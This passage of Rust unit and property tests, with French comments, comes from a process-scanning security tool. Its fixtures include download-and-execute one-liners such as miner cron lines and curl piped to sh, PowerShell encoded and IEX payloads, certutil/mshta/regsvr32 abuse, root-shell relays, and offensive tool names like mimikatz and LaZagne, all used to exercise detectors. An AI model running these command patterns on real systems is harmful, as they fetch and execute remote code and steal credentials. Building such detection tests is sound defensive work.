            r"powershell -ExecutionPolicy Bypass -File C:\Scripts\tiexport.ps1",
            "mshta.exe C:\\Program Files\\App\\aide.hta",
            "rundll32.exe printui.dll,PrintUIEntry",
            "certutil -hashfile a.iso SHA256",
            "curl -fsS https://x.example/a.json | jq .",
            "sh -c curl -s https://x.example || bash secours.sh",
            "base64 -d sauvegarde.b64",
            "/usr/bin/bash",
            "curl -fsS https://x.example/a.json | sudo -u alice jq .",
            "curl -s https://x.example/a.txt | env LANG=C grep -c sh",
            "powershell -NoProfile -Command Get-Date",
        ] {
            assert_eq!(suspect(ligne), None, "{ligne}");
        }
    }

    /// La ligne de cron des mineurs (TeamTNT, Kinsing) : le téléchargeur entre parenthèses, curl ou à défaut wget,
    /// passé à sh. Les parenthèses, « || » et « $( » ne cachent plus curl ni wget.
    #[test]
    fn telechargeur_entre_parentheses() {
        let cron = "(curl -fsSL http://192.0.2.7/a.sh||wget -q -O- http://192.0.2.7/a.sh)|sh";
        let m = passe_a_un_shell(cron).unwrap();
        assert_eq!((m.mot.as_str(), &cron[m.debut..m.fin]), ("curl", "curl"));
        assert_eq!(suspect(cron).as_deref(), Some("curl…"));
        assert_eq!(suspect(&format!("sh -c {cron}")).as_deref(), Some("sh … curl…"));
        for ligne in [
            "(curl -fsSL http://192.0.2.7/a.sh)|bash",
            "$(curl -fsSL http://192.0.2.7/a.sh)|sh",
            "(wget -q -O- http://192.0.2.7/a.sh)|sh",
            "cd /tmp;wget -q -O- http://192.0.2.7/a.sh|sh",
            "{ curl -s http://192.0.2.7/a.sh; }|sh",
            "`curl -s http://192.0.2.7/a.sh`|sh",
            "curl -s http://192.0.2.7/a.sh |& sh",
            "curl -s http://192.0.2.7/a.sh | (bash)",
        ] {
            assert!(passe_a_un_shell(ligne).is_some(), "{ligne}");
        }
        // « || » reste le « ou » du shell, pas un tube.
        assert!(passe_a_un_shell("(curl -fsSL http://192.0.2.7/a.sh||bash secours.sh)").is_none());
    }

    /// Un secret écrit avant le motif (une variable, un en-tête) n'est jamais montré : le programme et le motif seuls.
    #[test]
    fn secret_avant_le_motif_jamais_montre() {
        let lignes = [
            "sh -c GITHUB_TOKEN=ghp_x curl -fsSL https://x.example/i.sh | sh",
            "GITHUB_TOKEN=ghp_x curl -fsSL https://x.example/i.sh | sh",
            "bash -c Authorization='Bearer sk-x' wget -qO- http://192.0.2.7/a | bash",
            "sh -c X=sk-x; echo aGk= | base64 -d | sh",
            r#"powershell -c "$h=@{Authorization='Bearer sk-x'}; IEX (iwr https://x.example/a.ps1 -Headers $h)""#,
            r#"powershell -c "$t='ghp_x';(New-Object Net.WebClient).DownloadString('http://x.example/a')""#,
            "pwsh -w hidden -c $env:T='sk-x'; -enc SQBFAFgA",
            "certutil.exe -user ghp_x -urlcache -f http://192.0.2.7/a.exe a.exe",
            "mshta.exe --cle=sk-x https://x.example/a.hta",
        ];
        let attendus = [
            "sh … curl…",
            "curl…",
            "bash … wget…",
            "sh … base64 -d…",
            "powershell … IEX…",
            "powershell … DownloadString…",
            "pwsh … -enc…",
            "certutil.exe … -urlcache…",
            "mshta.exe … https:…",
        ];
        for (ligne, attendu) in lignes.iter().zip(attendus) {
            let e = suspect(ligne).unwrap_or_else(|| panic!("{ligne}"));
            assert_eq!(e, attendu, "{ligne}");
            // Le constat entier non plus.
            let c = juger_programmes(
                &[programme(4242, "sh", None, Some(ligne))],
                Os::Linux,
                &HashSet::new(),
                None,
            );
            assert!(c.len() == 1 && c[0].probleme == Some(Niveau::Eleve), "{ligne}");
            assert!(c[0].message.contains(attendu), "{}", c[0].message);
            assert!(
                !c[0].message.contains("ghp_") && !c[0].message.contains("sk-"),
                "{}",
                c[0].message
            );
        }
    }

    /// Les détours pour cacher l'interpréteur ou l'option : tirets longs de PowerShell, sudo -u, doas, env, busybox,
    /// exec et les variables devant le shell.
    #[test]
    fn contournements() {
        for tiret in ['\u{2013}', '\u{2014}', '\u{2015}'] {
            let ligne = format!("powershell.exe -nop {tiret}enc SQBFAFgA");
            assert_eq!(
                suspect(&ligne).as_deref(),
                Some(format!("powershell.exe … {tiret}enc…").as_str()),
                "{ligne}"
            );
            assert!(suspect(&format!("pwsh {tiret}EncodedCommand SQBFAFgA")).is_some());
        }
        // Un tiret long n'est pas une option de certutil.
        assert!(suspect("certutil \u{2013}urlcache -f http://192.0.2.7/a a").is_none());
        for tube in [
            "sudo -u root sh",
            "sudo -uroot -E bash",
            "sudo --user root sh",
            "sudo -g wheel -- sh",
            "doas -u root sh",
            "env -i PATH=/bin sh",
            "env -u HISTFILE bash",
            "busybox sh",
            "/bin/busybox sh -s",
            "ash",
            "busybox ash",
            "/bin/ash -s",
            "exec bash",
            "HISTFILE=/dev/null bash",
            "sudo env X=1 /usr/bin/python3",
        ] {
            let ligne = format!("curl -s http://192.0.2.7/a.sh | {tube}");
            assert!(passe_a_un_shell(&ligne).is_some(), "{ligne}");
        }
        // Le programme reçu est lu au bout des relais : jq et grep ne sont pas des interpréteurs.
        for tube in ["sudo -u sh jq .", "env SH=1 grep x", "busybox wc -l", "hash", "flash"] {
            let ligne = format!("curl -s http://192.0.2.7/a.sh | {tube}");
            assert!(passe_a_un_shell(&ligne).is_none(), "{ligne}");
        }
        assert_eq!(programme_du_morceau(" sudo -u root -g wheel sh -c x"), Some("sh"));
        // Les options à valeur de sudo, doas, env et exec ; les relais qui ouvrent eux-mêmes un shell root sur le tube.
        for tube in [
            "sudo -p x sh",
            "sudo -C 3 sh",
            "sudo -h hote sh",
            "sudo -D /tmp -R / -T 5 bash",
            "sudo -H sh",
            "SUDO -E BASH",
            "sudo --prompt x sh",
            "doas -C f sh",
            "exec -a nom sh",
            "env -C /tmp sh",
            "sudo -s",
            "sudo -i",
            "sudo -Es",
            "sudo -u root -i",
            "sudo --login",
            "doas -s",
            "su",
            "su -",
            "su - root",
            "/bin/su -l root",
            "su -c bash root",
            "su --command=sh",
            "sudo su",
        ] {
            let ligne = format!("curl -fsSL http://192.0.2.7/a.sh | {tube}");
            assert!(passe_a_un_shell(&ligne).is_some(), "{ligne}");
        }
        // Une valeur n'est pas prise pour le programme, ni -s ou -i d'un autre relais pour un shell.
        for tube in [
            "sudo -p sh jq .",
            "sudo -s jq .",
            "exec -a sh cat",
            "env -i",
            "su -c jq root",
            "busybox -s",
        ] {
            let ligne = format!("curl -fsSL http://192.0.2.7/a.sh | {tube}");
            assert!(passe_a_un_shell(&ligne).is_none(), "{ligne}");
        }
        assert_eq!(programme_du_morceau(" sudo -i"), Some("sh"));
        assert_eq!(programme_du_morceau(" sudo -i python3"), Some("python3"));
        assert!(affectation("PATH=/bin") && affectation("_x1=") && !affectation("1A=b") && !affectation("--user=root"));
    }

    fn programme(pid: u32, nom: &str, chemin: Option<&str>, ligne: Option<&str>) -> EnMarche {
        EnMarche {
            pid,
            parent: Some(1),
            nom: nom.into(),
            chemin: chemin.map(str::to_string),
            ligne: ligne.map(str::to_string),
            sans_fichier: false,
            ne: None,
        }
    }

    #[test]
    fn outils_offensifs() {
        let j = |p: &EnMarche| juger_programme(p, Os::Windows).map(|s| (s.niveau, s.raison));
        let mimi = programme(
            4242,
            "mimikatz.exe",
            Some(r"C:\Users\alice\Desktop\x\mimikatz.exe"),
            None,
        );
        assert_eq!(j(&mimi).map(|s| s.0), Some(Niveau::Eleve));
        assert!(
            j(&programme(
                7,
                "xmrig",
                Some("/home/alice/.cache/xmrig"),
                Some("./xmrig -o pool.example:3333")
            ))
            .is_some()
        );
        assert!(j(&programme(8, "SharpHound.exe", None, Some("SharpHound.exe -c All"))).is_some());
        assert!(j(&programme(9, "Rubeus.exe", None, None)).is_some());
        // Un script offensif lancé par un interpréteur se reconnaît à son nom.
        assert!(
            j(&programme(
                10,
                "python3",
                Some("/usr/bin/python3.12"),
                Some("python3 laZagne.py all")
            ))
            .is_some()
        );
        // Le chemin de l'interpréteur a des espaces, sans guillemets : son nom suffit à lire le script.
        let ps = r"C:\Program Files\PowerShell\7\pwsh.exe -File C:\Users\alice\Invoke-Mimikatz.ps1";
        assert!(j(&programme(14, "pwsh.exe", None, Some(ps))).is_some());
        // procdump seulement contre LSASS.
        assert!(
            j(&programme(
                11,
                "procdump64.exe",
                None,
                Some("procdump64.exe -ma lsass.exe l.dmp")
            ))
            .is_some()
        );
        assert!(
            j(&programme(
                12,
                "procdump.exe",
                None,
                Some("procdump.exe -ma 4242 jeu.dmp")
            ))
            .is_none()
        );
        // Le nom entier, jamais un préfixe : un script qui commence par le nom d'un outil n'est pas cet outil.
        for ligne in [
            "python3 sharphound_parser.py rapport.json",
            "pwsh ./Rubeus-Audit.ps1",
            "python3 xmrig_stats.py",
            "python3 mimikatz2john.py",
        ] {
            let p = programme(
                15,
                "python3",
                Some("/home/alice/.pyenv/versions/3.12.4/bin/python3.12"),
                Some(ligne),
            );
            assert!(offensif(&p).is_none(), "{ligne}");
        }
        // Reconnu par un argument : le processus est l'interpréteur, l'origine le dit.
        let p = programme(
            16,
            "python3",
            Some("/home/alice/.pyenv/versions/3.12.4/bin/python3.12"),
            Some("python3 /home/alice/outils/laZagne.py all"),
        );
        assert_eq!(
            offensif(&p).map(|(_, o)| o),
            Some(Origine::Argument("/home/alice/outils/laZagne.py".into()))
        );
        // Reconnu par le programme lui-même : certain.
        let p = programme(
            17,
            "xmrig",
            Some("/home/alice/.cache/xmrig"),
            Some("./xmrig -o pool.example:3333"),
        );
        assert_eq!(offensif(&p).map(|(_, o)| o), Some(Origine::Programme));
        // Un mot dans les arguments d'un programme ordinaire ne suffit pas.
        assert!(
            j(&programme(
                13,
                "grep",
                Some("/usr/bin/grep"),
                Some("grep -r mimikatz notes/")
            ))
            .is_none()
        );
    }

    #[test]
    fn dossiers_douteux() {
        let d = dossier_douteux;
        assert!(d(r"C:\Users\alice\AppData\Local\Temp\svch0st.exe", Os::Windows).is_some());
        assert!(d(r"C:\Windows\Temp\a.exe", Os::Windows).is_some());
        assert!(d(r"C:\Users\alice\Downloads\setup.exe", Os::Windows).is_some());
        assert!(d(r"C:\Users\Public\update.exe", Os::Windows).is_some());
        assert!(d(r"C:\$Recycle.Bin\S-1-5-21-1\x.exe", Os::Windows).is_some());
        assert!(d(r"C:\Program Files\Mozilla Firefox\firefox.exe", Os::Windows).is_none());
        assert!(d(r"C:\Users\alice\AppData\Local\Discord\app-1.0\Discord.exe", Os::Windows).is_none());
        // Linux : Téléchargements et la corbeille ; /tmp reste à la règle des programmes sans fichier.
        assert!(d("/home/alice/Téléchargements/outil", Os::Linux).is_some());
        assert!(d("/home/alice/Downloads/outil", Os::Linux).is_some());
        assert!(d("/home/alice/.local/share/Trash/files/x", Os::Linux).is_some());
        assert!(d("/tmp/.x/agent", Os::Linux).is_none());
        assert!(d("/usr/bin/bash", Os::Linux).is_none());
        // macOS : /tmp, le dossier temporaire du compte, Partagé, la corbeille, une application pas encore déplacée.
        assert!(d("/private/tmp/x", Os::MacOs).is_some());
        assert!(d("/private/var/folders/ab/cdef123/T/x/agent", Os::MacOs).is_some());
        assert!(
            d(
                "/private/var/folders/ab/cdef123/X/com.google.Chrome.code_sign_clone/x/Google Chrome",
                Os::MacOs
            )
            .is_none()
        );
        assert_eq!(
            d(
                "/private/var/folders/ab/cdef123/T/AppTranslocation/1234/d/App.app/Contents/MacOS/App",
                Os::MacOs
            ),
            d("/Users/alice/Downloads/App.app/Contents/MacOS/App", Os::MacOs)
        );
        assert!(d("/Users/Shared/.x/agent", Os::MacOs).is_some());
        assert!(d("/Users/alice/.Trash/x", Os::MacOs).is_some());
        assert!(d("/Applications/Firefox.app/Contents/MacOS/firefox", Os::MacOs).is_none());
    }

    /// Un programme lancé d'un dossier douteux : moyen, élevé s'il a été effacé depuis ; son chemin est montré.
    #[test]
    fn programme_d_un_dossier_douteux() {
        let mut p = programme(
            4242,
            "setup.exe",
            Some(r"C:\Users\alice\Downloads\setup.exe"),
            Some("setup.exe /S"),
        );
        let s = juger_programme(&p, Os::Windows).unwrap();
        assert_eq!(s.niveau, Niveau::Moyen);
        assert_eq!(s.extrait.as_deref(), Some(r"C:\Users\alice\Downloads\setup.exe"));
        p.sans_fichier = true;
        assert_eq!(juger_programme(&p, Os::Windows).unwrap().niveau, Niveau::Eleve);
        // Un chemin très long garde sa fin : le programme.
        let long = format!("C:\\Users\\alice\\Downloads\\{}\\outil.exe", "d".repeat(80));
        let s = juger_programme(&programme(5, "outil.exe", Some(&long), None), Os::Windows).unwrap();
        let e = s.extrait.unwrap();
        assert!(
            e.starts_with('…') && e.ends_with("outil.exe") && e.chars().count() == LONGUEUR_EXTRAIT,
            "{e}"
        );
    }

    /// Vanguard, une autre copie de lui-même et tout ce qu'ils lancent sont écartés, petits-enfants compris.
    #[test]
    fn vanguard_jamais_montre() {
        let moi = r"C:\Outils\vanguard.exe";
        let mut liste = vec![
            EnMarche {
                pid: 100,
                parent: Some(4),
                nom: "vanguard.exe".into(),
                chemin: Some(moi.into()),
                ..EnMarche::default()
            },
            EnMarche {
                pid: 200,
                parent: Some(100),
                nom: "powershell.exe".into(),
                ligne: Some("powershell -NoProfile -Command IEX $x".into()),
                ..EnMarche::default()
            },
            EnMarche {
                pid: 300,
                parent: Some(200),
                nom: "conhost.exe".into(),
                ..EnMarche::default()
            },
            EnMarche {
                pid: 400,
                parent: Some(4),
                nom: "vanguard.exe".into(),
                chemin: Some(moi.to_uppercase()),
                ..EnMarche::default()
            },
            EnMarche {
                pid: 500,
                parent: Some(4),
                nom: "powershell.exe".into(),
                ligne: Some("powershell -enc SQBFAFgA".into()),
                ..EnMarche::default()
            },
        ];
        let ecartes = de_vanguard(&liste, 100, Some(moi));
        assert!([100, 200, 300].iter().all(|p| ecartes.contains(p)));
        assert!(!ecartes.contains(&500));
        // La même casse de chemin vaut partout ; une autre casse ne vaut que sous Windows.
        assert_eq!(ecartes.contains(&400), cfg!(windows));
        let c = juger_programmes(&liste, Os::Windows, &ecartes, None);
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].probleme, Some(Niveau::Eleve));
        assert!(
            c[0].message.contains("PID 500") && !c[0].message.contains("PID 200"),
            "{}",
            c[0].message
        );
        assert!(!c[0].message.contains("SQBFAFgA"), "{}", c[0].message);
        // Rien de suspect : sain, en disant ce qui n'a pu être lu qu'en partie.
        liste.truncate(4);
        let c = juger_programmes(&liste, Os::Windows, &de_vanguard(&liste, 100, Some(moi)), Some("x."));
        assert_eq!(c.len(), 1);
        assert!(c[0].verifie && c[0].probleme.is_none());
        assert!(c[0].message.ends_with("x."), "{}", c[0].message);
    }

    /// Sous Windows, Vanguard a repris le numéro du parent mort de l'explorateur : l'explorateur, né avant lui, n'est
    /// pas son enfant, et ce qu'il a lancé reste examiné. Le vrai enfant de Vanguard, né après lui, est écarté. Sans
    /// dates, le lien est gardé, comme avant.
    #[test]
    fn numero_de_parent_repris() {
        let moi = r"C:\Outils\vanguard.exe";
        let a = |heure: &str| date_cim(&format!("20261021{heure}.000000-240"));
        let processus = |pid: u32, parent: u32, nom: &str, ne: &str| EnMarche {
            pid,
            parent: Some(parent),
            nom: nom.into(),
            ne: a(ne),
            ..EnMarche::default()
        };
        let mut vanguard = processus(100, 4, "vanguard.exe", "090000");
        vanguard.chemin = Some(moi.into());
        let mut cache = processus(600, 500, "powershell.exe", "083000");
        cache.ligne = Some("powershell -enc SQBFAFgA".into());
        let liste = vec![
            vanguard,
            processus(500, 100, "explorer.exe", "080000"),
            cache,
            processus(200, 100, "powershell.exe", "090001"),
        ];
        let ecartes = de_vanguard(&liste, 100, Some(moi));
        assert!(ecartes.contains(&100) && ecartes.contains(&200), "{ecartes:?}");
        assert!(!ecartes.contains(&500) && !ecartes.contains(&600), "{ecartes:?}");
        let c = juger_programmes(&liste, Os::Windows, &ecartes, None);
        assert!(
            c.len() == 1 && c[0].probleme == Some(Niveau::Eleve) && c[0].message.contains("PID 600"),
            "{}",
            c[0].message
        );
        // Une date manque : le lien est gardé.
        let sans: Vec<EnMarche> = liste
            .into_iter()
            .map(|p| EnMarche {
                ne: if p.pid == 500 { None } else { p.ne },
                ..p
            })
            .collect();
        let ecartes = de_vanguard(&sans, 100, Some(moi));
        assert!(ecartes.contains(&500) && ecartes.contains(&600), "{ecartes:?}");
    }

    /// Garde-fou du blocage : ce qui fait tourner Vanguard (terminal, shell, session SSH) n'est jamais arrêté.
    #[test]
    fn ancetres_de_vanguard() {
        let a = |heure: &str| date_cim(&format!("20261021{heure}.000000-240"));
        let p = |pid: u32, parent: u32, ne: &str| EnMarche {
            pid,
            parent: Some(parent),
            ne: a(ne),
            ..EnMarche::default()
        };
        // sshd (10), puis bash (20), puis Vanguard (30) ; 40 est un voisin.
        let liste = vec![
            p(1, 0, "070000"),
            p(10, 1, "071000"),
            p(20, 10, "080000"),
            p(30, 20, "090000"),
            p(40, 1, "090500"),
        ];
        // Un parent absent de la liste (0 ici) compte aussi : mieux vaut l'épargner à tort.
        assert_eq!(ancetres(&liste, 30), [20, 10, 1, 0]);
        // Le parent du shell est mort et son numéro a été repris par un processus plus jeune : la remontée s'arrête.
        let repris = vec![p(10, 1, "095000"), p(20, 10, "080000"), p(30, 20, "090000")];
        assert_eq!(ancetres(&repris, 30), [20]);
        // Une boucle ne fait pas tourner sans fin.
        let boucle = vec![
            EnMarche {
                pid: 5,
                parent: Some(6),
                ..EnMarche::default()
            },
            EnMarche {
                pid: 6,
                parent: Some(5),
                ..EnMarche::default()
            },
        ];
        assert_eq!(ancetres(&boucle, 5), [6]);
    }

    /// Les dates de WMI : à la microseconde, ramenées en UTC.
    #[test]
    fn dates_de_naissance() {
        let d = |t: &str| date_cim(t).map(|d| d.format("%Y-%m-%d %H:%M:%S%.6f").to_string());
        assert_eq!(
            d("20261021063000.123456-240").as_deref(),
            Some("2026-10-21 10:30:00.123456")
        );
        assert_eq!(
            d("20261021063000.000000+060").as_deref(),
            Some("2026-10-21 05:30:00.000000")
        );
        assert!(date_cim("20261021063000.000001+000") > date_cim("20261021063000.000000+000"));
        // Le même instant écrit à l'heure d'été (UTC−4), puis à l'heure normale (UTC−5).
        assert_eq!(
            date_cim("20261101013000.000000-240"),
            date_cim("20261101003000.000000-300")
        );
        for illisible in ["", "pas une date", "20261021063000", "20261021063000.000000"] {
            assert_eq!(date_cim(illisible), None, "{illisible}");
        }
    }

    /// Élevés et moyens dans deux constats, chacun à son niveau ; un nom piégé ne pilote pas le terminal.
    #[test]
    fn constats_des_programmes() {
        let mut piege = programme(77, "x\x1b]0;y\x07", Some("/home/alice/Downloads/x"), Some("./x"));
        piege.sans_fichier = false;
        let liste = vec![
            piege,
            programme(78, "xmrig", Some("/opt/x/xmrig"), Some("/opt/x/xmrig")),
            programme(79, "bash", Some("/usr/bin/bash"), Some("bash")),
        ];
        let c = juger_programmes(&liste, Os::Linux, &HashSet::new(), None);
        assert_eq!(c.len(), 2);
        assert_eq!(c[0].probleme, Some(Niveau::Eleve));
        assert!(c[0].message.contains("PID 78"), "{}", c[0].message);
        assert_eq!(c[1].probleme, Some(Niveau::Moyen));
        assert!(
            c[1].message.contains("PID 77") && !c[1].message.contains('\x1b'),
            "{}",
            c[1].message
        );
        assert!(c.iter().all(|c| c.correctif.as_ref().is_some_and(|k| !k.automatique)));
    }

    /// La vraie lecture de ce système : rien ne plante, Vanguard (ce test) n'est jamais montré. Aucun verdict : il
    /// dépend de ce qui tourne ici.
    #[test]
    fn lecture_reelle() {
        if let Some((liste, _)) = programmes_en_marche() {
            let moi = std::process::id();
            let ecartes = de_vanguard(&liste, moi, None);
            assert!(ecartes.contains(&moi));
            for c in juger_programmes(&liste, Os::actuel(), &ecartes, None) {
                assert!(!c.message.contains(&format!("(PID {moi})")), "{}", c.message);
            }
        }
        let _ = connexion_forcee();
    }
}

/// Une ligne de commande, un chemin ou un nom tenté sur SSH sont choisis par celui qu'on cherche : jamais de panique,
/// un motif toujours à sa place dans la ligne, et ce qui est montré reste court et inoffensif.
#[cfg(test)]
mod entrees_hostiles {
    use super::*;
    use crate::ui::piege;
    use proptest::prelude::*;

    /// Une ligne de commande : des mots que la chasse cherche (téléchargeurs, interpréteurs, relais et leurs options,
    /// LOLBins et leurs détournements, tirets longs), des séparateurs du shell, des caractères multi-octets ou qui
    /// changent de longueur en minuscules (İ, K de Kelvin), des pièges d'affichage, et des mots quelconques.
    fn ligne() -> impl Strategy<Value = String> {
        let mot = prop_oneof![
            prop::sample::select(vec![
                "curl",
                "wget",
                "-fsSL",
                "http://203.0.113.9/a.sh",
                "|",
                "||",
                "sh",
                "bash",
                "ash",
                "/bin/sh",
                "python3",
                "busybox",
                "sudo",
                "-u",
                "root",
                "-s",
                "-i",
                "-Es",
                "-p",
                "su",
                "-",
                "-c",
                "--command=sh",
                "doas",
                "env",
                "exec",
                "-a",
                "X=1",
                "GITHUB_TOKEN=ghp_x",
                "base64",
                "-d",
                "--decode",
                "powershell",
                "pwsh.exe",
                "powershell.exe",
                "-enc",
                "\u{2013}enc",
                "\u{2014}EncodedCommand",
                "/e",
                "-ec",
                "iex",
                "IEX(",
                "Invoke-Expression",
                "DownloadString(",
                "mshta",
                "mshta.exe",
                "javascript:",
                "vbscript:",
                "regsvr32",
                "/i:http://x",
                "scrobj.dll",
                "rundll32",
                "certutil",
                "-urlcache",
                "/decode",
                "bitsadmin",
                "/transfer",
                "\"C:\\Program Files\\App\\x.exe\"",
                "C:\\Program Files\\İ\\run.exe",
                "node.exec\\run.exe",
                ".exe",
                "İ",
                "\u{212a}",
                "é",
                "😀",
                "\u{202e}",
                "\u{1b}[2J",
                "(",
                ")",
                ";",
                "&",
                "`",
                "{",
                "}",
                "\"",
                "'",
                "",
            ])
            .prop_map(str::to_string),
            any::<String>(),
            "[ -~]{0,12}",
        ];
        let separateur = prop::sample::select(vec![" ", "", "\t", "|", "||", ";", "  "]);
        prop::collection::vec((mot, separateur), 0..14).prop_map(|v| v.into_iter().map(|(m, s)| m + s).collect())
    }

    /// Un outil de Windows détourné (ou non) en tête, puis des mots de la chasse et du bruit.
    fn lolbin() -> impl Strategy<Value = String> {
        let programme = prop::sample::select(vec![
            "powershell",
            "PowerShell.exe",
            "pwsh",
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\"",
            "mshta",
            "regsvr32.exe",
            "rundll32",
            "certutil",
            "CertUtil.exe",
            "bitsadmin",
            "İ.exe",
        ]);
        (programme, ligne()).prop_map(|(p, l)| format!("{p} {l}"))
    }

    /// Un téléchargeur ou un décodeur passé par un tube à un interpréteur, derrière des relais et leurs options, au
    /// milieu de bruit.
    fn tube() -> impl Strategy<Value = String> {
        let source = prop::sample::select(vec![
            "curl",
            "wget",
            "/usr/bin/curl",
            "CURL",
            "base64 -d",
            "base64 --decode",
        ]);
        let relais = prop::collection::vec(
            prop::sample::select(vec![
                "sudo",
                "-u",
                "root",
                "-s",
                "-i",
                "-H",
                "env",
                "-i",
                "X=1",
                "busybox",
                "exec",
                "-a",
                "nom",
                "doas",
                "su",
                "-",
                "-c",
                "--command=sh",
            ]),
            0..5,
        );
        let interprete = prop::sample::select(vec!["sh", "bash", "ash", "python3", "/bin/sh", "PERL", "x", "\"sh\""]);
        (ligne(), source, ligne(), relais, interprete, ligne())
            .prop_map(|(avant, s, milieu, r, i, apres)| format!("{avant}{s} {milieu}|{} {i} {apres}", r.join(" ")))
    }

    /// Une ligne de sshd : les débuts lus, des noms tentés qui contiennent eux-mêmes « from … port … », des adresses
    /// et des ports vrais ou faux.
    fn ligne_ssh() -> impl Strategy<Value = String> {
        let debut = prop::sample::select(vec![
            "Failed password for ",
            "Failed password for invalid user ",
            "Failed keyboard-interactive/pam for ",
            "Invalid user ",
            "Accepted password for ",
            "Accepted publickey for ",
            "",
        ]);
        let adresse = prop_oneof![
            any::<[u8; 4]>().prop_map(|o| IpAddr::from(o).to_string()),
            any::<[u8; 16]>().prop_map(|o| IpAddr::from(o).to_string()),
            any::<String>(),
        ];
        let port = prop_oneof![any::<u16>().prop_map(|p| p.to_string()), "[0-9:]{0,8}", any::<String>()];
        (debut, ligne(), adresse, port, any::<String>())
            .prop_map(|(d, compte, a, p, fin)| format!("{d}{compte} from {a} port {p} ssh2{fin}"))
    }

    proptest! {
        #![proptest_config(ProptestConfig { cases: 1024, failure_persistence: None, ..ProptestConfig::default() })]

        #[test]
        fn lignes_de_commande(l in prop_oneof![ligne(), lolbin(), tube(), any::<String>()]) {
            if let Some((_, montre)) = commande_suspecte(&l) {
                prop_assert!(montre.chars().count() <= LONGUEUR_EXTRAIT + 1, "{montre:?}");
                prop_assert!(!montre.chars().any(piege), "{montre:?}");
            }
            if let Some(m) = passe_a_un_shell(&l) {
                prop_assert!(m.debut <= m.fin && l.get(m.debut..m.fin).is_some(), "{l:?} {m:?}");
            }
            let args = l.split_once(' ').map_or("", |(_, a)| a);
            for programme in ["powershell", "pwsh", "mshta", "regsvr32", "rundll32", "certutil", "bitsadmin"] {
                if let Some(m) = detournement(programme, args) {
                    prop_assert!(m.debut <= m.fin && args.get(m.debut..m.fin).is_some(), "{args:?} {m:?}");
                }
            }
            let p = EnMarche { nom: l.clone(), chemin: Some(l.clone()), ligne: Some(l.clone()), ..EnMarche::default() };
            for systeme in [Os::Linux, Os::Windows, Os::MacOs] {
                if let Some(s) = juger_programme(&p, systeme) {
                    prop_assert!(s.extrait.is_none_or(|e| e.chars().count() <= LONGUEUR_EXTRAIT + 1));
                }
            }
        }

        #[test]
        fn lignes_de_sshd(lignes in prop::collection::vec(prop_oneof![ligne_ssh(), any::<String>()], 0..12)) {
            let datees: Vec<((), &str)> = lignes.iter().map(|l| ((), l.as_str())).collect();
            let tentatives = tentatives_ssh_datees(&datees);
            prop_assert!(tentatives.len() <= lignes.len());
            let _ = intrusions(&tentatives.into_iter().map(|((), t)| t).collect::<Vec<_>>());
        }
    }
}
